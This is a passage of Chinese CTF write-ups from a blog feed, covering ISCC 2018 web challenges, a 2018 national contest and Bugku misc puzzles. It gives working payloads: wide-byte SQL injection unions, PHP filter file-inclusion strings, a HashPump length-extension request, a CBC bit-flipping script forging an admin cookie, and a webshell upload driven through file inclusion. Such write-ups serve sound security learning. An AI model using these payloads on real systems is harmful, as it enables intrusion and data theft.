rel="external">http://vinc.top/2016/12/22/%E3%80%90%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E3%80%91%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/</a></p><p>方法二:</p><p> 使用扫描器，扫描一下目录。如下图所示； <img src="http://www.360zhijia.com/wp-content/uploads/2018/05/25/834add0a-fcb1-4893-bd20-de7ff3e922d4.png" alt="第一手详细又全面的ISCC 2018 writeup等你学习"> 扫描结果：<a href="http://118.190.152.202:8018/flag.txt" target="_blank" rel="external">http://118.190.152.202:8018/flag.txt</a> （3） 打开扫描结果，如下图所示； <img src="http://www.360zhijia.com/wp-content/uploads/2018/05/25/afd1056b-c0f7-4735-aff0-2cf288df693f.png" alt="第一手详细又全面的ISCC 2018 writeup等你学习"> </p><h3 id="php是世界上最好的语言"><a href="#php是世界上最好的语言" class="headerlink" title="php是世界上最好的语言"></a>php是世界上最好的语言</h3><p><img src="http://oy0tigw51.bkt.clouddn.com/201805170015_39.png" alt=""></p><pre><code class="php">&lt;?php header(&quot;content-type:text/html;charset=utf-8&quot;); if(isset($_POST[&#39;username&#39;])&amp;isset($_POST[&#39;password&#39;])){     $username = $_POST[&#39;username&#39;];     $password = $_POST[&#39;password&#39;]; } else{     $username=&quot;hello&quot;;     $password=&quot;hello&quot;; } if(md5($password) == 0){     echo &quot;xxxxx&quot;; } show_source(__FILE__); ?&gt;</code></pre><p>md5</p><p>password=240610708</p><p>跳转</p><pre><code class="php">&lt;?php include &#39;flag.php&#39;; $a = @$_REQUEST[&#39;a&#39;]; @eval(&quot;var_dump($$a);&quot;); show_source(__FILE__); ?&gt;</code></pre><p>$$a 这个东西很诡异。其实就是php中变量可以当作另一个变量的变量名 </p><p><strong>$GLOBALS</strong> — 引用全局作用域中可用的全部变量</p><p>$GLOBALS 这种全局变量用于在 PHP 脚本中的任意位置访问全局变量（从函数或方法中均可）。</p><p>PHP 在名为 $GLOBALS[index] 的数组中存储了所有全局变量。变量的名字就是数组的键。</p><p>这里介绍一个php中的特殊变量: <code>$GLOBALS</code>，它的作用如下： </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805170011_680.png" alt=""></p><p> 所以我们可以利用<code>$GLOBALS</code>输出flag的值，故payload： </p><p><a href="http://118.190.152.202:8005/no_md5.php?a=GLOBALS" target="_blank" rel="external">http://118.190.152.202:8005/no_md5.php?a=GLOBALS</a></p><p>ISCC{a39f9a1ff7eb4bab8a6a21b2ce111b4} </p><h3 id="Please-give-me-username-and-password"><a href="#Please-give-me-username-and-password" class="headerlink" title="Please give me username and password!"></a>Please give me username and password!</h3><p>在url传参username和password得到界面提示有index.php.txt文件</p><p>所以访问<a href="http://118.190.152.202:8017/index.php.txt" target="_blank" rel="external">http://118.190.152.202:8017/index.php.txt</a></p><p>得到源码</p><pre><code>&lt;?phperror_reporting(0);$flag = &quot;***********&quot;;    if(isset($_GET[&#39;username&#39;])){    if (0 == strcasecmp($flag,$_GET[&#39;username&#39;])){    $a = fla;    echo &quot;very good!Username is right&quot;;    }    else{    print &#39;Username is not right&lt;!--index.php.txt--&gt;&#39;;}}elseprint &#39;Please give me username or password!&#39;;if (isset($_GET[&#39;password&#39;])){    if (is_numeric($_GET[&#39;password&#39;])){        if (strlen($_GET[&#39;password&#39;]) &lt; 4){            if ($_GET[&#39;password&#39;] &gt; 999){            $b = g;            print &#39;&lt;p&gt;very good!Password is right&lt;/p&gt;&#39;;        }else             print &#39;&lt;p&gt;Password too little&lt;/p&gt;&#39;;        }else        print &#39;&lt;p&gt;Password too long&lt;/p&gt;&#39;;    }else    print &#39;&lt;p&gt;Password is not numeric&lt;/p&gt;&#39;;}if ($a.$b == &quot;flag&quot;)    print $flag;?&gt;</code></pre><p>分析</p><pre><code>if(isset($_GET[&#39;username&#39;])){    if (0 == strcasecmp($flag,$_GET[&#39;username&#39;])){    $a = fla;    echo &quot;very good!Username is right&quot;;</code></pre><blockquote><p>strcasecmp(string1,string2)</p><p> 参数 str1第一个字符串。str2第二个字符串。</p><p>如果 str1 小于 str2 返回 &lt; 0；</p><p> 如果 str1 大于 str2 返回 &gt; 0；</p><p>如果两者相等，返回 0。 </p></blockquote><p>可以使用username数组绕过</p><pre><code>if (is_numeric($_GET[&#39;password&#39;])){        if (strlen($_GET[&#39;password&#39;]) &lt; 4){            if ($_GET[&#39;password&#39;] &gt; 999){            $b = g;</code></pre><p>必须通过3位数字，但大于999</p><p><a href="http://52.10.107.64:8002/?password=4e3" target="_blank" rel="external">?password=4e3</a> </p><p><a href="http://118.190.152.202:8017/index.php?username[]=1&amp;password=4e3" target="_blank" rel="external">http://118.190.152.202:8017/index.php?username[]=1&amp;password=4e3</a> </p><p>flag{ISCC2018_Very_GOOD!} </p><p>Reference：</p><p><a href="https://hackfun.org/2018/01/09/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81PHP%E7%89%B9%E6%80%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" target="_blank" rel="external">https://hackfun.org/2018/01/09/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81PHP%E7%89%B9%E6%80%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></p><p><a href="https://github.com/bl4de/ctf/blob/master/2015/BostonKeyPartyCTF_2015/Symphony.md" target="_blank" rel="external">https://github.com/bl4de/ctf/blob/master/2015/BostonKeyPartyCTF_2015/Symphony.md</a></p><h3 id="SQL注入的艺术"><a href="#SQL注入的艺术" class="headerlink" title="SQL注入的艺术"></a>SQL注入的艺术</h3><p>注入点:个人信息栏</p><p>发现页面编码是gb2312，可能是宽字节注入，检验一下<code>id=1%df&#39;--+</code>，返回正常页面，确定是宽字节注入 </p><pre><code>id=1%df&#39; or 1=1  order by 8--+  id=1%df&#39; or 1=1  order by 9--+id=-1%df&#39; union select 1,2,3,4,5,6,7,8--+    id=-1%df&#39; union select 1,database(),3,user(),5,6,group_concat(table_name),8 from information_schema.tables where table_schema = database() --+  id=-1%df&#39; union select 1,database(),3,user(),5,6,group_concat(column_name),8 from information_schema.columns where table_name = 0x61646d696e73 --+ id=-1%df&#39; union select 1,database(),3,user(),5,6,group_concat(flag),8 from admins --+</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201805080049_453.png" alt=""></p><p> Flag：Y0u_@<a href="https://github.com/33w_dxxmn_9rf0Od" target="_blank" rel="external">@33w_dxxmn_9rf0Od</a> </p><h3 id="试试看"><a href="#试试看" class="headerlink" title="试试看"></a>试试看</h3><p><a href="http://118.190.152.202:8006/show.php?img=php://filter/read=convert.base64-encode/resource=jpg/resource=show.php" target="_blank" rel="external">http://118.190.152.202:8006/show.php?img=php://filter/read=convert.base64-encode/resource=jpg/resource=show.php</a></p><p>打开题目</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805140857_654.png" alt=""></p><p>查看源码<img src="http://oy0tigw51.bkt.clouddn.com/201805140858_867.png" alt=""></p><p>知道这里调用show.php?img=1.jpg  访问 并修改1的值</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805140901_199.png" alt=""></p><p>大概可以猜测 文件包含漏洞，尝试</p><pre><code class="php">img=php://filter/read=convert.base64-encode/resource=show.php</code></pre><p>但是不行</p><p>题目的坑点在于还需要包含jpg，这就是贪婪包含所在，也就是后台某处代码所致，</p><p>curl <a href="http://118.190.152.202:8006/show.php?img=php://filter/resource=jpg/resource=show.php" target="_blank" rel="external">http://118.190.152.202:8006/show.php?img=php://filter/resource=jpg/resource=show.php</a></p><pre><code class="php">&lt;?phperror_reporting(0);ini_set(&#39;display_errors&#39;,&#39;Off&#39;);include(&#39;config.php&#39;);$img = $_GET[&#39;img&#39;];if(isset($img) &amp;&amp; !empty($img)){    if(strpos($img,&#39;jpg&#39;) !== false)    {        if(strpos($img,&#39;resource=&#39;) !== false &amp;&amp; preg_match(&#39;/resource=.*jpg/i&#39;,$img) === 0)        {            die(&#39;File not found.&#39;);        }        preg_match(&#39;/^php:\/\/filter.*resource=([^|]*)/i&#39;,trim($img),$matches);        if(isset($matches[1]))        {            $img = $matches[1];        }        header(&#39;Content-Type: image/jpeg&#39;);        $data = get_contents($img);        echo $data;    }    else    {        die(&#39;File not found.&#39;);    }}else{    ?&gt;    &lt;img src=&quot;1.jpg&quot;&gt;    &lt;?php}?&gt;</code></pre><ol><li>开头包含了config.php</li><li>img必须有jpg但又不能有resource=.*jpg</li><li>正则检查了并把结果填充到$matches 里去，说明我们可以使用php://filter伪协议，并且resource的值不含|，那么我们就可以用| 来分隔php 和jpg，因为正则匹配到| 就不会继续匹配后面的jpg 了，使得\$img=show.php</li></ol><p>知道了config.php再去访问明白为什么必须包含jpg</p><pre><code class="php">&lt;?phpfunction get_contents($img){        if(strpos($img,&#39;jpg&#39;) !== false)        {                return file_get_contents($img);        }        else        {                header(&#39;Content-Type: text/html&#39;);                return file_get_contents($img);        }}?&gt;</code></pre><p>最终payload:</p><p><a href="http://118.190.152.202:8006/show.php?img=php://filter/resource=../flag.php|jpg" target="_blank" rel="external">http://118.190.152.202:8006/show.php?img=php://filter/resource=../flag.php|jpg</a></p><!-- flag{1ntere5ting_PHP_Regu1ar_express1onssssss} --><h3 id="Collide"><a href="#Collide" class="headerlink" title="Collide"></a>Collide</h3><pre><code>&lt;?phpinclude &quot;secret.php&quot;;@$username=(string)$_POST[&#39;username&#39;];function enc($text){    global $key;    return md5($key.$text);}if(enc($username) === $_COOKIE[&#39;verify&#39;]){    if(is_numeric(strpos($username, &quot;admin&quot;))){        die($flag);    }    else{        die(&quot;you are not admin&quot;);    }}else{    setcookie(&quot;verify&quot;, enc(&quot;guest&quot;), time()+60*60*24*7);    setcookie(&quot;len&quot;, strlen($key), time()+60*60*24*7);}show_source(__FILE__);</code></pre><ol><li>一个不知道的$key，但是从cookie中可以知道它的长度是46</li><li>从cookie中知道md5(\$key.guest) 的值，也就是知道enc(\$username) 符合条件的值</li><li>获得flag 的条件，满足enc(\$username) == md5(\$key.guest)，同时\$username 要含有admin</li></ol><p>使用HashPump攻击； </p><p>安装HashPump；</p><p> 方法一： git clone <a href="https://github.com/bwall/HashPump.git" target="_blank" rel="external">https://github.com/bwall/HashPump.git</a> apt-get install g++ libssl-dev cd HashPump make make install B.方法二： pip install hashpumpy </p><p>方法二:</p><p>pip install hashpumpy </p><pre><code>$ hashpump -s &#39;78cfc57d983b4a17e55828c001a3e781&#39; -d &#39;guest&#39; -a &#39;admin&#39; -k 465f585093a7fe86971766c3d25c43d0ebguest\x80\x00\x00\x00\x00\x98\x01\x00\x00\x00\x00\x00\x00admin</code></pre><p>POST / HTTP/1.1<br>Host: 118.190.152.202:8002<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3<br>Cookie: verify=5f585093a7fe86971766c3d25c43d0eb; len=46<br>Connection: close<br>Upgrade-Insecure-Requests: 1<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 58</p><p>username=guest%80%00%00%00%00%98%01%00%00%00%00%00%00admin</p><p>ISCC{MD5_1s_n0t_5afe}</p><p><a href="http://p0sec.net/index.php/archives/99/" target="_blank" rel="external">http://p0sec.net/index.php/archives/99/</a></p><p><a href="http://quincyblog.top/2018/05/08/%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E7%9A%84%E5%AD%A6%E4%B9%A0/#more" target="_blank" rel="external">http://quincyblog.top/2018/05/08/%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E7%9A%84%E5%AD%A6%E4%B9%A0/#more</a></p><h3 id="Only-admin-can-see-flag"><a href="#Only-admin-can-see-flag" class="headerlink" title="Only admin can see flag"></a>Only admin can see flag</h3><p>查看源码得提示index.txt，访问得到源码 </p><pre><code class="php">&lt;?phpinclude &#39;sqlwaf.php&#39;;define(&quot;SECRET_KEY&quot;, &quot;................&quot;);define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;);session_start();function get_random_iv(){    $iv=&#39;&#39;;    for($i=0;$i&lt;16;$i++){        $iv.=chr(rand(1,255));    }    return $iv;}// 使用aes-128-cbc 模式加密function login($info){    $iv=get_random_iv();    $plain = serialize($info);    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);    $_SESSION[&#39;username&#39;] = $info[&#39;username&#39;];    setcookie(&quot;iv&quot;, base64_encode($iv));// cookie[iv] = 随机生成的iv 的base64    setcookie(&quot;cipher&quot;, base64_encode($cipher));// cookie[cipher] = 加密值的base64}function show_homepage(){    if ($_SESSION[&quot;username&quot;]===&#39;admin&#39;){//发现当账号为admin，才会显示flag，        echo &#39;&lt;p&gt;Hello admin&lt;/p&gt;&#39;;        echo &#39;&lt;p&gt;Flag is *************&lt;/p&gt;&#39;;    }else{        echo &#39;&lt;p&gt;hello &#39;.$_SESSION[&#39;username&#39;].&#39;&lt;/p&gt;&#39;;        echo &#39;&lt;p&gt;Only admin can see flag&lt;/p&gt;&#39;;    }    echo &#39;&lt;p&gt;&lt;a href=&quot;loginout.php&quot;&gt;Log out&lt;/a&gt;&lt;/p&gt;&#39;;    die();}// 解密cipherfunction check_login(){    if(isset($_COOKIE[&#39;cipher&#39;]) &amp;&amp; isset($_COOKIE[&#39;iv&#39;])){        $cipher = base64_decode($_COOKIE[&#39;cipher&#39;]);        $iv = base64_decode($_COOKIE[&quot;iv&quot;]);//cipher和iv变量均中cookie数组中取        if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)){            $info = unserialize($plain) or die(&quot;&lt;p&gt;base64_decode(&#39;&quot;.base64_encode($plain).&quot;&#39;) can&#39;t unserialize&lt;/p&gt;&quot;);            $_SESSION[&#39;username&#39;] = $info[&#39;username&#39;];        }else{            die(&quot;ERROR!&quot;);        }    }}if (isset($_POST[&#39;username&#39;])&amp;&amp;isset($_POST[&#39;password&#39;])) {  $username=waf((string)$_POST[&#39;username&#39;]);  $password=waf((string)$_POST[&#39;password&#39;]);  if($username === &#39;admin&#39;){        exit(&#39;&lt;p&gt;You are not real admin!&lt;/p&gt;&#39;);//当我们以admin账号登录时，程序会直接跳出    }else{        $info = array(&#39;username&#39;=&gt;$username,&#39;password&#39;=&gt;$password);        login($info);        show_homepage();    }//否则正常登录，并将用户信息存在info数组中传入login函数，并调用show_homepage函数。}else{  if(isset($_SESSION[&quot;username&quot;])){        check_login();        show_homepage();    }}?&gt;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot; &gt;&lt;head&gt;  &lt;meta charset=&quot;UTF-8&quot;&gt;  &lt;title&gt;Paper login form&lt;/title&gt;      &lt;link rel=&quot;stylesheet&quot; href=&quot;css/style.css&quot;&gt;&lt;/head&gt;&lt;body&gt;  &lt;div id=&quot;login&quot;&gt;  &lt;form action=&quot;&quot; method=&quot;post&quot;&gt;    &lt;h1&gt;Sign In&lt;/h1&gt;    &lt;input name=&#39;username&#39; type=&quot;text&quot; placeholder=&quot;Username&quot;&gt;    &lt;input name=&#39;password&#39; type=&quot;password&quot; placeholder=&quot;Password&quot;&gt;    &lt;button&gt;Sign in&lt;/button&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>思路就是构造一个Admin用户，然后将大写的A翻转成小写的a，即是admin。我们点击登录之后，可以在cookie中获取到iv和cipher的值（看14行的login函数），然后我们先将cipher的第9个字符使用异或运算翻转成小写字母a，因为info数组序列化后，我们要翻转的大写字母A在下标为9的位置，每个分组的长度为16，因为返回的iv变量长度为16（要先经过base64解密）</p><ol><li>s:2:{s:8:”userna</li><li>me”;s:5:”Admin”;</li><li>s:8:”password”;s</li><li>:5:”admin”;}</li></ol><p>要第二组的b变为d 就要第一组的u改变 </p><p>python脚本：</p><pre><code class="python">import urllib,base64,requests,reurl = &quot;http://118.190.152.202:8001/index.php&quot;datas = {    &quot;username&quot; : &quot;Admin&quot;,    &quot;password&quot; : &quot;admin&quot;}r = requests.post(url,data=datas)cipher = r.cookies.get(&quot;cipher&quot;)cipher = base64.b64decode(urllib.unquote(cipher))offset = 9new_cipher = cipher[:offset] + chr(ord(cipher[offset])^ord(&quot;A&quot;)^ord(&quot;a&quot;)) + cipher[offset+1:]new_cookies = requests.utils.dict_from_cookiejar(r.cookies)new_cookies[&quot;cipher&quot;] = urllib.quote_plus(base64.b64encode(new_cipher))r2 = requests.get(url,cookies=new_cookies)plain = base64.b64decode(re.findall(&quot;decode\(&#39;(.*)&#39;\)&quot;,r2.text)[0])iv = base64.b64decode(urllib.unquote(new_cookies[&quot;iv&quot;]))old = plain[:len(iv)]new = &#39;a:2:{s:8:&quot;userna&#39;new_iv = &quot;&quot;.join([chr(ord(iv[i])^ord(old[i])^ord(new[i])) for i in xrange(16)])new_cookies[&quot;iv&quot;] = urllib.quote_plus(base64.b64encode(new_iv))r3 = requests.get(url,cookies=new_cookies)print(r3.text)</code></pre><p>看其他师傅的其他解题：</p><p><a href="https://mp.weixin.qq.com/s?srcid=0525HLtDRNGV7DM8TsC469W2&amp;scene=23&amp;mid=2247484248&amp;sn=05c6b69fc6bd49b0ff8d1b9b8842d0fb&amp;idx=1&amp;__biz=MzUxOTYzMzU0NQ%3D%3D&amp;chksm=f9f7ecbece8065a88c1bf77efbc67106aacfc93942e72198a26efca026788ddfc75be75030d2&amp;mpshare=1#rd" target="_blank" rel="external">https://mp.weixin.qq.com/s?srcid=0525HLtDRNGV7DM8TsC469W2&amp;scene=23&amp;mid=2247484248&amp;sn=05c6b69fc6bd49b0ff8d1b9b8842d0fb&amp;idx=1&amp;__biz=MzUxOTYzMzU0NQ%3D%3D&amp;chksm=f9f7ecbece8065a88c1bf77efbc67106aacfc93942e72198a26efca026788ddfc75be75030d2&amp;mpshare=1#rd</a>  </p><p><a href="https://www.anquanke.com/post/id/146063" target="_blank" rel="external">https://www.anquanke.com/post/id/146063</a></p><p><a href="https://blog.zilch40.wang/2018/05/25/iscc-2018-writeup/#Collide-250" target="_blank" rel="external">https://blog.zilch40.wang/2018/05/25/iscc-2018-writeup/#Collide-250</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>全国网络空间安全技术大赛2018三道wp</title>
      <link href="/archives/ceb4048b/"/>
      <url>/archives/ceb4048b/</url>
      
        <content type="html"><![CDATA[<h1 id="全国网络空间安全技术大赛2018三道wp"><a href="#全国网络空间安全技术大赛2018三道wp" class="headerlink" title="全国网络空间安全技术大赛2018三道wp"></a>全国网络空间安全技术大赛2018三道wp</h1><h2 id="MISC1"><a href="#MISC1" class="headerlink" title="MISC1"></a>MISC1</h2><p>得到一张图片</p><p>binwalk 发现是zip加密</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805121134_772.png" alt=""></p><p>直接修改后缀.zip</p><p>打开压缩包之后发现需要解压密码</p><p>猜测是伪加密那就直接尝试伪加密，利用伪加密判断工具ZipCenOp</p><pre><code>java -jar ZipCenOp.jar r xxx.zip</code></pre><p>得到一个txt</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805121128_864.png" alt=""></p><p>一开始以为是base64解码 把除了最后一行的==删除 去解码发现是乱码，知道思路不对 ，后来想起xdctf出过一到base64隐写</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805121124_544.png" alt=""></p><p>编码原理：Base64编码要求把3个8位字节转化为4个6位的字节，之后在6位的前面补两个0，形成8位一个字节的形式，6位2进制能表示的最大数是2的6次方是64，这也是为什么是64个字符(A-Z,a-z，0-9，+，/这64个编码字符，=号不属于编码字符，而是填充字符)的原因，这样就需要一张映射表，如下：</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201810141056_335.png" alt=""></p><p>举个例子(base64)：</p><p>源文本：T h e</p><p>对应ascii码:84 104 101</p><p>8位binary：01010100 01101000 01100101</p><p>6位binary：010101 000110 100001 100101</p><p>高位补0：000010101 00000110 00100001 00100101</p><p>对应ascii码：21 6 33 37</p><p>查表：V G h l</p><h4 id="隐写原理"><a href="#隐写原理" class="headerlink" title="隐写原理"></a>隐写原理</h4><p>A对应的二进制位为01000001，补全之后为01000001    0000，对应的base64的编码为QQ（010000     010000），所以之后有两个‘=’。在解码的时候我就要在去掉=对应的6个零的同时在去掉4个0，也就是解码的时候会解析01000001而不是010000010000。这时候我们会发现了，我们去掉的这四个0是不是可以用来隐藏信息？？？反正解码的时候会被裁剪掉，那我干脆就在后面做一些手脚，用base64来混淆视听。 </p><pre><code class="python">#!/usr/bin/python#coding:utf-8b64chars = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#39;with open(&#39;stego.txt&#39;, &#39;rb&#39;) as f:    bin_str = &#39;&#39;    for line in f.readlines():        stegb64 = &#39;&#39;.join(line.split())        rowb64 =  &#39;&#39;.join(stegb64.decode(&#39;base64&#39;).encode(&#39;base64&#39;).split())        offset = abs(b64chars.index(stegb64.replace(&#39;=&#39;,&#39;&#39;)[-1])-b64chars.index(rowb64.replace(&#39;=&#39;,&#39;&#39;)[-1]))        equalnum = stegb64.count(&#39;=&#39;) #no equalnum no offset        if equalnum:            bin_str += bin(offset)[2:].zfill(equalnum * 2)        print &#39;&#39;.join([chr(int(bin_str[i:i + 8], 2)) for i in xrange(0, len(bin_str), 8)]) #8位一组</code></pre><p>可以看这个师傅写的：<a href="https://www.tr0y.wang/2017/06/14/Base64steg/" target="_blank" rel="external">https://www.tr0y.wang/2017/06/14/Base64steg/</a></p><p><a href="https://github.com/amor-tsai/php_screw.git" target="_blank" rel="external">https://github.com/amor-tsai/php_screw.git</a></p><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><p>打开一个登陆界面 ，</p><p>先注册，进入 右上角有个修改密码 猜测是任意密码重置</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805131624_405.png" alt=""></p><p>提示flag在flag.php里</p><p>抓包发现自己的Mang0被base64加密 然后url编码</p><p>所以想到username更改admin尝试密码重置逻辑问题。</p><p>username=YWRtaW4%3D</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805130011_460.png" alt=""></p><p>发现密码重置成功，进入登陆界面 登陆成功</p><p>发现页面叫我们填写远程图片地址，一开始尝试上传木马地址，然后上传木马图片但是都没有用处，问题在哪里呢</p><p>思考发现会不会ssrf漏洞， 让服务器自己伪造请求，</p><p>后将地址改成本地的flag.php</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805130048_442.png" alt=""></p><p>得到 两个图片地址第二个图片是我们上传的，但是被解析就是jgp,</p><p>无法利用所以利用点在于第一幅图片。</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805130049_141.png" alt=""></p><p>访问第一幅图片地址，下载下来 得到flag</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805130049_976.png" alt=""></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805130050_718.png" alt=""></p><p>保存图片得到flag</p><h2 id="web02"><a href="#web02" class="headerlink" title="web02"></a>web02</h2><p>git源码泄露，</p><p>githack工具下载源码审计</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805131640_57.png" alt=""></p><p>upload很奇怪</p><p>进入查看，谷歌查询<a href="http://0day5.com/archives/4022/" target="_blank" rel="external">http://0day5.com/archives/4022/</a></p><p>存在免认证登录漏洞</p><p>访问<a href="http://117.34.116.192/upload.php" target="_blank" rel="external">http://117.34.116.192/upload.php</a></p><p>burp抓包改cookie</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805131648_158.png" alt=""></p><p>进入</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805131650_741.png" alt=""></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805131650_29.png" alt=""></p><p>上传文件包含</p><p><a href="http://117.34.116.192/index.php?file=./img/img26019845.jpg" target="_blank" rel="external">http://117.34.116.192/index.php?file=./img/img26019845.jpg</a></p><p>index.php 会把这jpg解析成php运行</p><p>菜刀连接得到fl4g.php</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805131810_848.png" alt=""></p><p>需要php反编译，得到原始代码</p><p>flag{7cb3d823105433606ccac8fb75aed67c}</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>bugku-misc</title>
      <link href="/archives/e36e397d/"/>
      <url>/archives/e36e397d/</url>
      
        <content type="html"><![CDATA[<h1 id="bugku-misc"><a href="#bugku-misc" class="headerlink" title="bugku misc"></a>bugku misc</h1><p>做了iscc2018发现自己misc能力差很多，也忘了很多，这周做了bugku misc，总结一下。</p><h3 id="这是一张单纯的图片"><a href="#这是一张单纯的图片" class="headerlink" title="这是一张单纯的图片"></a>这是一张单纯的图片</h3><p>直接文本编辑器打开；文本末尾发现了一行转义序列： </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804281525_944.png" alt=""></p><blockquote><p>Unicode编码有以下四种编码方式：</p><p>源文本： <code>The</code></p><p>&amp;#x [Hex]： <code>&amp;#x0054;&amp;#x0068;&amp;#x0065;</code></p><p>&amp;# [Decimal]： <code>&amp;#00084;&amp;#00104;&amp;#00101;</code></p><p>\U [Hex]： <code>\U0054\U0068\U0065</code></p><p>\U+ [Hex]： <code>\U+0054\U+0068\U+0065</code></p></blockquote><p>unicode——&gt;acsii</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804281343_354.png" alt=""></p><p>key{you are right}</p><h3 id="隐写"><a href="#隐写" class="headerlink" title="隐写"></a>隐写</h3><p>先来了解一下png的头文件。</p><p><code>89 50 4E 47 0D 0A 1A 0A</code> ——&gt;PNG头部署名域，表示这是一个PNG图片</p><p><code>00 00 00 0D</code> ——-&gt;描述IHDR头部的大小</p><p><code>49 48 44 52</code> ——&gt;是Chunk Type Code, 这里Chunk Type Code=IHDR</p><p><code>F9 7D AA 93</code> ——&gt;对IHDR的CRC校验</p><p><code>00 00 01 F4</code> ——&gt;图像宽度，500像素</p><p><code>00 00 01 A4</code> ——&gt;图像高度。</p><p>png的标志就是IHDR</p><p><a href="https://blog.csdn.net/joqian/article/details/8290389" target="_blank" rel="external">https://blog.csdn.net/joqian/article/details/8290389</a></p><p>下载rar文件，打开得到一张图片。</p><p>我们把它放到kali中，用binwalk分析一下。  </p><p>发现只是一张图片而已。但这时候发现一个问题，这张图片并不能打开。 </p><p>winhex打开最后从图片格式入手，更改其高度得到flag</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804281627_225.png" alt=""></p><p>将A4改为F4</p><p>BUGKU{a1e5aSA}</p><p>winhex的png原理：<a href="http://blog.csdn.net/bisword/article/details/2777121" target="_blank" rel="external">http://blog.csdn.net/bisword/article/details/2777121</a></p><h3 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h3><p>1.追踪TCP流</p><p>2.根据题目提示查看telnet协议，一个个找下去，在第41个数据包找到flag</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804281647_239.png" alt=""></p><h3 id="眼见非实-ISCCCTF"><a href="#眼见非实-ISCCCTF" class="headerlink" title="眼见非实(ISCCCTF)"></a>眼见非实(ISCCCTF)</h3><p>WinHex 常见文件头</p><blockquote><p>JPEG (jpg)，文件头：FFD8FF<br>PNG (png)，文件头：89504E47<br>GIF (gif)，文件头：47494638<br>TIFF (tif)，文件头：49492A00<br>Windows Bitmap (bmp)，文件头：424D<br>CAD (dwg)，文件头：41433130<br>Adobe Photoshop (psd)，文件头：38425053<br>Rich Text Format (rtf)，文件头：7B5C727466<br>XML (xml)，文件头：3C3F786D6C<br>HTML (html)，文件头：68746D6C3E<br>Email [thorough only]<br>(eml)，文件头：44656C69766572792D646174653A<br>Outlook Express (dbx)，文件头：CFAD12FEC5FD746F<br>Outlook (pst)，文件头：2142444E<br>MS Word/Excel (xls.or.doc)，文件头：D0CF11E0<br>MS Access (mdb)，文件头：5374616E64617264204A<br>WordPerfect (wpd)，文件头：FF575043<br>Postscript. (eps.or.ps)，文件头：252150532D41646F6265<br>Adobe Acrobat (pdf)，文件头：255044462D312E<br>Quicken (qdf)，文件头：AC9EBD8F<br>Windows Password (pwl)，文件头：E3828596<br>ZIP Archive (zip)，文件头：504B0304<br>RAR Archive (rar)，文件头：52617221<br>Wave (wav)，文件头：57415645<br>AVI (avi)，文件头：41564920<br>Real Audio (ram)，文件头：2E7261FD<br>Real Media (rm)，文件头：2E524D46<br>MPEG (mpg)，文件头：000001BA<br>MPEG (mpg)，文件头：000001B3<br>Quicktime (mov)，文件头：6D6F6F76<br>Windows Media (asf)，文件头：3026B2758E66CF11<br>MIDI (mid)，文件头：4D546864</p></blockquote><p>改后缀为zip进行解压，得到一个word文档，但是打开是乱码</p><p>winhex打开</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804281655_885.png" alt=""></p><p>所以是zip文件 从新将.doc 改成.zip</p><p>word文件夹里发现里面有个名为document的文件 ，在里面的document.xml发现flag </p><p>flag{F1@g}</p><h3 id="又一张图片，还单纯吗？？"><a href="#又一张图片，还单纯吗？？" class="headerlink" title="又一张图片，还单纯吗？？"></a>又一张图片，还单纯吗？？</h3><p>用binwalk检测发现还有一张图片把图片提取出来，就是flag</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804292329_656.png" alt=""></p><h3 id="猜"><a href="#猜" class="headerlink" 